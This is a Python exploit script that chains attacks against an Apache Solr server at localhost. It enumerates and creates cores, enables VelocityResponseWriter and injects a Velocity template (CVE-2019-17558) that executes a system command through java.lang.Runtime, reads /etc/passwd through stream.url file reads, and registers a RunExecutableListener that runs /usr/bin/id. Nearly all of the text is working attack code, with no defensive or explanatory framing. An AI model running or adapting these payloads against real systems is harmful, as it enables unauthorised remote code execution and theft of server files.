
import requests
import json

SOLR = "http://localhost:8983/solr"

print("=" * 65)
print("  🔴 SOLR RCE EXPLOITATION CHAIN — Apache Solr 8.11.0")
print("=" * 65)

# Step 1: Enumerate cores
print("\n[1] ENUMERATING SOLR CORES...")
try:
    r = requests.get(f"{SOLR}/admin/cores?action=STATUS&wt=json", timeout=10)
    data = r.json()
    cores = list(data.get("status", {}).keys())
    print(f"    Found cores: {cores if cores else 'NONE'}")
    if not cores:
        print("    No cores exist. Will try global exploits...")
except Exception as e:
    print(f"    Error: {e}")
    cores = []

# Step 2: Check Solr system info for more attack surface
print("\n[2] SOLR SYSTEM INFO...")
try:
    r = requests.get(f"{SOLR}/admin/info/system?wt=json", timeout=10)
    if r.status_code == 200:
        data = r.json()
        print(f"    Solr Version: {data.get('lucene', {}).get('solr-spec-version', 'unknown')}")
        print(f"    JVM: {data.get('jvm', {}).get('name', 'unknown')} {data.get('jvm', {}).get('version', 'unknown')}")
        print(f"    OS: {data.get('os', {}).get('name', 'unknown')} {data.get('os', {}).get('version', 'unknown')}")
        print(f"    Hostname: {data.get('core', {}).get('host', 'unknown')}")
except Exception as e:
    print(f"    Error: {e}")

# Step 3: Try to create a test core for exploitation
print("\n[3] ATTEMPTING TO CREATE TEST CORE FOR EXPLOITATION...")
if not cores:
    # Try to find instance dir
    try:
        r = requests.get(f"{SOLR}/admin/cores?action=STATUS&wt=json", timeout=10)
        # Try creating a core
        create_resp = requests.post(f"{SOLR}/admin/cores?action=CREATE&name=exploit&configSet=_default&wt=json", timeout=10)
        if create_resp.status_code == 200:
            print("    [+] Created core 'exploit' successfully!")
            cores = ['exploit']
        else:
            print(f"    Could not create core: {create_resp.status_code}")
            # Try another approach - use the default collection
            create_resp2 = requests.post(f"{SOLR}/admin/cores?action=CREATE&name=test&instanceDir=/opt/solr/server/solr/test&configSet=data_driven_schema_configs&wt=json", timeout=10)
            if "success" in create_resp2.text.lower():
                print("    [+] Created core 'test'!")
                cores = ['test']
            else:
                print(f"    Core creation failed: {create_resp2.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")

# Step 4: CVE-2019-17558 - VelocityResponseWriter RCE
print("\n[4] CVE-2019-17558: VelocityResponseWriter Template Injection...")
for core in cores:
    print(f"\n    Trying core: {core}")
    
    # First, enable VelocityResponseWriter via Config API
    print(f"    [4a] Enabling VelocityResponseWriter on '{core}'...")
    config_payload = {
        "update-queryresponsewriter": {
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
    }
    try:
        r = requests.post(f"{SOLR}/{core}/config", json=config_payload, timeout=10)
        print(f"    Config API response: {r.status_code}")
        if r.status_code == 200:
            print("    [+] VelocityResponseWriter ENABLED!")
    except Exception as e:
        print(f"    Config error: {e}")
    
    # Now try the template injection
    print(f"    [4b] Injecting Velocity template for RCE...")
    # Velocity template that executes 'id' command
    velocity_payload = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime()) #set($out=$ex.exec('id')) $out"
    
    try:
        r = requests.get(f"{SOLR}/{core}/select", params={
            "q": "1",
            "wt": "velocity",
            "v.template": "custom",
            "v.template.custom": velocity_payload
        }, timeout=10)
        print(f"    Velocity RCE response: {r.status_code}")
        if r.status_code == 200:
            print(f"    [+] RCE OUTPUT: {r.text[:500]}")
        else:
            print(f"    Response: {r.text[:300]}")
    except Exception as e:
        print(f"    Velocity error: {e}")

# Step 5: Try Solr RCE via /solr/debug/dump endpoint
print("\n[5] SOLR DEBUG/DUMP ENDPOINTS...")
debug_endpoints = [
    "/solr/debug/dump?param=ContentStream&stream.url=file:///etc/passwd",
    "/solr/admin/info/properties?wt=json",
    "/solr/admin/metrics?wt=json&group=all",
]
for ep in debug_endpoints:
    try:
        r = requests.get(f"http://localhost:8983{ep}", timeout=10)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"    [+] {ep.split('?')[0]}: HTTP {r.status_code} ({len(r.text)} bytes)")
            if "passwd" in ep or "root" in r.text:
                print(f"        Content preview: {r.text[:300]}")
    except:
        pass

# Step 6: Try RemoteStreaming / SSRF via stream.url
print("\n[6] SSRF/FILE READ via stream.url...")
ssrf_tests = [
    f"{SOLR}/debug/dump?param=ContentStream&stream.url=file:///etc/passwd",
    f"{SOLR}/debug/dump?param=ContentStream&stream.url=file:///etc/hostname",
]
for url in ssrf_tests:
    try:
        r = requests.get(url, timeout=10)
        if "root:" in r.text or r.status_code == 200:
            print(f"    [+] SSRF SUCCESS: {url.split('stream.url=')[1]}")
            # Extract useful content
            lines = [l for l in r.text.split('\n') if l.strip() and '<' not in l]
            for l in lines[:10]:
                print(f"        {l.strip()}")
    except:
        pass

# Step 7: Solr RunExecutableListener RCE
print("\n[7] RunExecutableListener RCE (pre-8.2 exploit)...")
for core in cores:
    try:
        payload = {
            "add-listener": {
                "event": "postCommit",
                "name": "rce_listener",
                "class": "solr.RunExecutableListener",
                "dir": "/usr/bin/",
                "exe": "id"
            }
        }
        r = requests.post(f"{SOLR}/{core}/config", json=payload, timeout=10)
        print(f"    Listener config: {r.status_code} - {r.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")

# Step 8: Check Solr API for RCE via schema/config manipulation
print("\n[8] ADDITIONAL SOLR ATTACK SURFACE...")
additional_paths = [
    "/solr/admin/info/logging?wt=json&since=0",
    "/solr/admin/info/cores?wt=json",
    "/solr/admin/file?file=solr.xml",
]
for path in additional_paths:
    try:
        r = requests.get(f"http://localhost:8983{path}", timeout=10)
        if r.status_code == 200:
            print(f"    [+] {path.split('?')[0]}: {r.status_code} ({len(r.text)} bytes)")
    except:
        pass

print("\n" + "=" * 65)
print("  EXPLOITATION CHAIN COMPLETE")
print("=" * 65)

